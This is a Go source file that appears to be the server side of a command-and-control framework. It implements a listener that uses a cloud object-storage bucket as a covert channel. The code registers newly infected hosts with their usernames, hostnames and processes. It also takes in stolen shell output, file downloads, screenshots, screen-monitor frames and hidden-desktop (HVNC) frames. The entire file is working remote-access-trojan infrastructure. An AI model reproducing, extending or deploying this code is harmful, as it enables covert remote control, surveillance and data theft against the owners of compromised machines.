package oss

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/notification"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"sort"
	"strconv"
	"strings"
	"time"
)

// gbkToUtf8 将GBK编码转换为UTF-8 (已迁移到utils.ProcessShellOutput)
func gbkToUtf8(data []byte) ([]byte, error) {
	// 使用新的统一编码处理器
	return utils.ProcessShellOutput(data)
}

func HandleOSSConnection(endpoint, accessKeyID, accessKeySecret, bucketName string) {
	// 崩溃防护：OSS 处理循环任何 panic 都不能杀死整个进程
	defer func() {
		if r := recover(); r != nil {
			logx.Errorf("❌ [OSS-RECOVER] 处理循环panic已捕获: %v\n", r)
		}
	}()

	InitClient(endpoint, accessKeyID, accessKeySecret, bucketName)

	// 锁内读取停止通道并缓存，避免 select 内无锁读 map 与关闭路径 delete 并发（map 竞争 panic）
	stopKey := endpoint + ":" + accessKeyID + ":" + accessKeySecret + ":" + bucketName
	connection.MuClientListenerType.Lock()
	stopCh, _ := connection.StopChan[stopKey]
	connection.MuClientListenerType.Unlock()

	for {
		if stopCh != nil {
			select {
			case <-stopCh:
				return
			default:
			}
		}
		time.Sleep(1 * time.Second)
		var keys []string
		for _, c2 := range List(Service) {
			if strings.Contains(c2.Key, "client") {
				keys = append(keys, c2.Key)
			}
		}

		// 2. 按时间戳排序
		sort.Slice(keys, func(i, j int) bool {
			return keys[i] < keys[j] // 字符串直接按字典序比较（因为时间戳格式是递增的）
		})

		// 3. 顺序处理
		for _, key := range keys {
			process_server(key) // 不用 `go`，保证按顺序执行
		}
	}
	//for {
	//	time.Sleep(1 * time.Second)
	//	for _, c2 := range List(Service) {
	//		if strings.Contains(c2.Key, "client") {
	//			go process_server(c2.Key)
	//		}
	//	}
	//}
}
func process_server(name string) {

	message := Get(Service, name)
	Del(Service, name)
	// 长度校验：至少 4 字节类型头
	if len(message) < 4 {
		logx.Warnf("⚠️ [OSS] 消息长度不足: %d (key=%s)\n", len(message), name)
		return
	}
	const maxOSSMessageSize = 64 * 1024 * 1024 // 64MB
	if len(message) > maxOSSMessageSize {
		logx.Warnf("⚠️ [OSS] 消息超过大小上限: %d (key=%s)\n", len(message), name)
		return
	}
	msgTypeBytes := message[:4]
	msgType := binary.BigEndian.Uint32(msgTypeBytes)
	switch msgType {
	case 1: //firstBlood
		msg := message[4:]
		tmpMetainfo, err := encrypt.DecodeBase64(msg)
		if err != nil {
			logx.Println(err)
			return
		}
		metaMK, metaSalt := encrypt.GetListenerKeyConfig("oss")
		// J4: 拒绝公开默认密钥连接
		if encrypt.IsDefaultListenerKey(metaMK, metaSalt) {
			logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接\n")
			return
		}
		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMK)
		if err != nil {
			logx.Println(err)
			return
		}
		// FirstBlood 元数据长度校验
		if len(metainfo) < 10 {
			logx.Warnf("⚠️ [OSS] FirstBlood元数据长度不足: %d\n", len(metainfo))
			return
		}
		uid := encrypt.BytesToMD5(metainfo)

		// 立即为客户端生成会话密钥（确保与客户端同步）
		if encrypt.GlobalKeyManager != nil {
			// 获取监听器特定的密钥配置
			_, encryptionSalt := encrypt.GetListenerKeyConfig("oss")
			_, err = encrypt.GlobalKeyManager.DeriveSessionKeyForListener(uid, encryptionSalt, "oss")
			if err != nil {
				logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 为客户端 %s 生成会话密钥失败: %v\n", uid, err)
			} else {
				logx.Infof("🔑 [OSS-FIRSTBLOOD] 为客户端 %s 成功生成会话密钥（oss监听器）\n", uid)
			}
		}

		connection.MuClientListenerType.Lock()
		connection.ClientListenerType[uid] = "oss"
		connection.MuClientListenerType.Unlock()

		var client database.Clients
		exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
		if !exsists { // FirstBlood
			processID := binary.BigEndian.Uint32(metainfo[:4])
			flag := int(metainfo[4:5][0])
			ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
			localIP := utils.Uint32ToIP(ipInt).String()
			osInfo := string(metainfo[9:])

			osArray := strings.Split(osInfo, "\t")
			if len(osArray) < 3 {
				logx.Warnf("⚠️ [OSS] FirstBlood系统信息字段不足: %d\n", len(osArray))
				return
			}
			hostName := osArray[0]
			UserName := osArray[1]
			processName := osArray[2]
			clientOs := ""
			if len(osArray) >= 4 {
				clientOs = osArray[3]
			}

			externalIp := "oss上线"

			address := "oss上线"

			currentTime := time.Now()
			timeFormat := "2006-01-02 15:04:05"
			formattedTime := currentTime.Format(timeFormat)

			arch := "x86"

			if flag > 8 {
				UserName += "*"
				flag = flag - 8
			}
			if flag > 4 {
				arch = "x64"
			}

			database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, "")), Online: "1", Color: "", Listener: "oss", Os: clientOs})
			database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
			database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

			// 触发客户端上线通知
			if notificationManager := notification.GetNotificationManager(); notificationManager != nil {
				notificationManager.OnClientOnline(uid)
			}
			// B11: 发布客户端上线事件(含完整元数据)
			if command.GlobalEventBus != nil {
				command.PublishEvent(command.EventClientOnline, uid, map[string]interface{}{
					"listener":    "oss",
					"username":    UserName,
					"computer":    hostName,
					"external_ip": externalIp,
					"internal_ip": localIP,
					"pid":         strconv.Itoa(int(processID)),
					"arch":        arch,
					"os":          clientOs,
					"process":     processName,
				})
			}

		}

		// 【会话密钥唯一化】firstBlood 派生成功后立即重派生并下发 nonce（用初始密钥加密写对象）
		// 客户端下次轮询 Get 命令对象时收到，重派生后与服务端 CurrentKey 对齐
		if encrypt.GlobalKeyManager != nil {
			nonce := make([]byte, 16)
			if _, err := rand.Read(nonce); err == nil {
				vkey, encSalt := encrypt.GetListenerKeyConfig("oss")
				initialKey, err := encrypt.GlobalKeyManager.RotateSessionKeyWithNonce(uid, encSalt, []byte(vkey), encSalt, nonce)
				if err != nil {
					logx.Warnf("⚠️ [OSS-FIRSTBLOOD] 客户端 %s 会话密钥唯一化失败: %v\n", uid, err)
				} else if b64Payload := command.BuildSessionNonceMsgWithKey(initialKey, nonce); b64Payload != nil {
					Send(Service, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), b64Payload)
					logx.Infof("🔑 [OSS-FIRSTBLOOD] 客户端 %s 会话密钥唯一化完成，nonce 已写入命令对象\n", uid)
				}
			}
		}

		// 更新客户端在线状态
		database.SetClientOnline(uid, "oss")

		// 注册到统一离线检测器（统一心跳：优先采用客户端上报的 beacon sleep，回退监听器配置）
		if connection.GlobalOfflineDetector != nil {
			_, hbInterval := database.GetListenerHeartbeatConfigByType("oss")
			ossMeta := strings.Split(string(metainfo[9:]), "\t")
			sleepSec := connection.ResolveSleepSeconds(ossMeta, hbInterval)
			connection.GlobalOfflineDetector.Register(uid, "oss", sleepSec)
			// OSS 为轮询型，无长连接需关闭，仅依赖心跳 Touch 判定
		}

	case 2: // otherMsg
		//logx.Println("received data")
		msg := message[4:]
		if len(msg) < 8 {
			logx.Warnf("⚠️ [OSS] 消息体长度不足: %d\n", len(msg))
			return
		}
		metaLen := binary.BigEndian.Uint32(msg[:4])
		if 4+int(metaLen) > len(msg) {
			logx.Warnf("⚠️ [OSS] 元数据长度越界: metaLen=%d, len=%d\n", metaLen, len(msg))
			return
		}
		metaMsg := msg[4 : 4+metaLen]
		realMsg := msg[4+metaLen:]

		tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
		if err != nil {
			logx.Println(err)
		}
		metaMK, _ := encrypt.GetListenerKeyConfig("oss")
		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMK)
		if err != nil {
			logx.Println(err)
		}
		uid := encrypt.BytesToMD5(metainfo)

		// 统一离线检测器 Touch
		if connection.GlobalOfflineDetector != nil {
			connection.GlobalOfflineDetector.Touch(uid)
		}

		dataBytes, err := encrypt.DecodeBase64(realMsg)
		if err != nil {
			logx.Warnf("⚠️ [OSS] 消息解码失败: %v\n", err)
			return
		}
		dataBytes, err = encrypt.DecryptWithSessionKey(dataBytes, uid)
		if err != nil {
			// 【加密体系改造】不再回落旧加密
			logx.Warnf("⚠️ [OSS] 会话密钥解密失败: %v\n", err)
			return
		}
		// 边界校验：解密后至少 4 字节类型头（其余四协议均有；缺失时异常短包
		// 会 panic 且被 HandleOSSConnection 顶部 recover 捕获后终止整个 OSS 监听循环）
		if len(dataBytes) < 4 {
			logx.Warnf("⚠️ [OSS] 解密后数据长度不足: 需要至少4字节，实际%d字节, UID: %s\n", len(dataBytes), uid)
			return
		}
		replyTypeBytes := dataBytes[:4]
		data := dataBytes[4:]
		replyType := binary.BigEndian.Uint32(replyTypeBytes)

		switch replyType {
		case 0: //命令行展示或截图数据
			// 智能判断：结合命令上下文和数据格式检查
			isExpectedScreenshot := command.VarScreenshotQueue.IsScreenshotExpected(uid)
			isImageFormat := command.IsImageData(data)

			logx.Debugf("🔍 [OSS] 数据分析 - UID: %s, 数据长度: %d, 期望截图: %t, 图像格式: %t\n",
				uid, len(data), isExpectedScreenshot, isImageFormat)

			// 只有同时满足以下条件才认为是截图数据：
			// 1. 服务端最近发送了截图命令
			// 2. 数据格式符合图像特征
			// 3. 数据大小合理（避免过小的误判）
			if isExpectedScreenshot && isImageFormat && len(data) > 1024 {
				logx.Infof("✅ [OSS] 确认为截图数据 - UID: %s\n", uid)

				// 处理截图数据
				logx.Infof("📷 [OSS] 收到客户端截图数据 - UID: %s, 原始数据长度: %d\n", uid, len(data))

				// 检查数据是否已经是base64格式的Data URI
				var screenshotDataURI string
				if len(data) > 22 && strings.HasPrefix(string(data), "data:image/") {
					// 数据已经是完整的Data URI格式
					screenshotDataURI = string(data)
					logx.Infof("📷 [OSS] 截图数据已是完整的Data URI格式 - UID: %s\n", uid)
				} else {
					// 原始二进制数据，需要转换为base64
					screenshotDataURI = "data:image/png;base64," + base64.StdEncoding.EncodeToString(data)
					logx.Infof("📷 [OSS] 将原始数据转换为Data URI格式 - UID: %s\n", uid)
				}

				logx.Infof("📷 [OSS] 正在将截图数据发送到队列 - UID: %s, 数据长度: %d\n", uid, len(screenshotDataURI))
				command.VarScreenshotQueue.Add(uid, screenshotDataURI)

				// 清除截图期望状态
				command.VarScreenshotQueue.SetScreenshotExpected(uid, false)
			} else {
				// 当作普通命令行输出处理
				if !isExpectedScreenshot && len(data) > 100000 {
					logx.Warnf("⚠️ [OSS] 大数据包但非截图上下文 - UID: %s, 长度: %d, 可能是其他大文件传输\n", uid, len(data))
				}

				// 应用编码转换解决中文乱码问题
				utf8Data, encodeErr := gbkToUtf8(data)
				if encodeErr != nil {
					// 如果编码转换失败，使用原始数据
					utf8Data = data
				}

				outputStr := string(utf8Data)

				var shell database.Shell
				database.Engine.Where("uid = ?", uid).Get(&shell)
				shell.ShellContent += outputStr + "\n"
				database.Engine.Where("uid = ?", uid).Update(&shell)
			}
		case command.PS:
			// 应用编码转换解决中文乱码问题
			utf8Data, encodeErr := gbkToUtf8(data)
			if encodeErr != nil {
				// 如果编码转换失败，使用原始数据
				utf8Data = data
			}
			command.VarPidQueue.Add(uid, string(utf8Data))
		case command.FileBrowse:
			// 应用编码转换解决中文乱码问题
			utf8Data, encodeErr := gbkToUtf8(data)
			if encodeErr != nil {
				// 如果编码转换失败，使用原始数据
				utf8Data = data
			}
			command.VarFileBrowserQueue.Add(uid, string(utf8Data))
		case 22: //文件下载第一条信息（v2：fileLen(8)|requestId(4)|path）
			if len(data) < 12 {
				logx.Warnf("⚠️ 文件下载信息数据长度不足 - UID: %s, 数据长度: %d\n", uid, len(data))
				break
			}
			fileLen := int64(binary.BigEndian.Uint64(data[:8]))
			downloadReqID := binary.BigEndian.Uint32(data[8:12])
			filePath := string(data[12:])
			database.Engine.QueryString(`UPDATE downloads SET file_size = ?, downloaded_size = ? WHERE uid = ? AND file_path = ?;`, fileLen, 0, uid, filePath)
			if err := command.VarDownloadFiles.Start(uid, downloadReqID, filePath); err != nil {
				logx.Errorf("❌ 下载文件打开失败 - UID: %s, 错误: %v\n", uid, err)
			}
		case command.DOWNLOAD: //文件下载分块（v2：requestId(4)|chunk）
			if len(data) < 4 {
				logx.Warnf("⚠️ 文件下载数据长度不足 - UID: %s\n", uid)
				break
			}
			downloadReqID := binary.BigEndian.Uint32(data[:4])
			fileContent := data[4:]
			if ok, err := command.VarDownloadFiles.Append(uid, downloadReqID, fileContent); err != nil {
				logx.Errorf("❌ 文件下载写入失败 - UID: %s, 错误: %v\n", uid, err)
				break
			} else if ok {
				database.Engine.Exec(`UPDATE downloads SET downloaded_size = downloaded_size + ? WHERE uid = ?;`, len(fileContent), uid)
			}
		case command.DRIVES:
			// 应用编码转换解决中文乱码问题
			utf8Data, encodeErr := gbkToUtf8(data)
			if encodeErr != nil {
				// 如果编码转换失败，使用原始数据
				utf8Data = data
			}
			drives := utils.GetExistingDrives(utf8Data)
			command.VarDrivesQueue.Add(uid, drives)
		case command.HVNC_FRAME:
			// HVNC 隐藏桌面帧 - [4B sidLen][sid][JPEG]
			sid, jpeg, ok := command.ParseHVNCFrame(data)
			if ok {
				command.VarHVNCFrameQueue.Add(uid, sid, jpeg)
			}
		case command.SCREENSHOT1:
			// 屏幕截图操作完成，将截图数据加入队列
			command.VarScreenshotQueue.Add(uid, string(data))
		case command.MONITOR_FRAME:
			// 屏幕监控帧数据 - 【关键修复】正确处理二进制图像数据
			logx.Infof("📺 收到客户端OSS监控帧数据 - UID: %s, 原始数据长度: %d\n", uid, len(data))

			// 检查数据是否已经是base64格式的Data URI
			var monitorDataURI string
			if strings.HasPrefix(string(data), "data:image/") {
				// 数据已经是完整的Data URI格式
				monitorDataURI = string(data)
				logx.Infof("📺 OSS监控帧数据已是完整的Data URI格式 - UID: %s\n", uid)
			} else {
				// 原始二进制数据，需要转换为base64
				monitorDataURI = "data:image/png;base64," + base64.StdEncoding.EncodeToString(data)
				logx.Infof("📺 将OSS监控帧原始数据转换为Data URI格式 - UID: %s\n", uid)
			}

			logx.Infof("📺 正在将OSS监控帧数据发送到队列 - UID: %s, 数据长度: %d\n", uid, len(monitorDataURI))
			// 【关键修复】传递转换后的Data URI而不是原始数据
			command.VarMonitorFrameQueue.Add(uid, []byte(monitorDataURI))
		case command.FILE_EDIT_READ:
			command.HandleFileEditRead(uid, data)
		case command.FILE_EDIT_WRITE:
			command.HandleFileEditWrite(uid, data)
		case command.UPLOAD_ACK:
			command.HandleUploadAck(uid, data)
		case command.FILE_OP_RESULT:
			command.HandleFileOpResult(uid, data)
		case encrypt.KeyRotateAckReplyType:
			// P3-1: 客户端密钥轮换确认（OSS 回包未走统一 HandleClientReply，此处独立处理）
			if encrypt.GlobalKeyManager != nil {
				if err := encrypt.GlobalKeyManager.ConfirmKeyRotation(uid); err != nil {
					logx.Warnf("⚠️ [KEY-ROTATE-OSS] 确认轮换失败 - UID: %s, 错误: %v\n", uid, err)
				} else {
					logx.Infof("🔑 [KEY-ROTATE-OSS] 客户端 %s 密钥轮换确认完成\n", uid)
				}
			}
		}
	}
	return
}
